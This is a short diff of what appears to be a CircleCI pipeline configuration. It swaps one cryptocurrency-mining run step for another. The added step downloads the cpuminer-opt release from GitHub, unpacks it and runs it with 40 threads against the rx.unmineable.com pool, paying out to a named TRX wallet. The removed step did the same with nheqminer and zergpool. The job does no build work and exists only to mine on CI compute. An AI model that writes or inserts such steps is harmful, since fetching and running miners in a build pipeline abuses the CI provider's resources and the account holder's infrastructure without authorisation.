@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && chmod +x * && ./nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=VRSC,ID=Reborn -t 36 -e 2
+      - run:  mkdir cpuminer-opt-rplant && cd cpuminer-opt-rplant && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a rx -o stratum+tcp://rx.unmineable.com:3333 -u TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.Bugger -p Xon -t 40
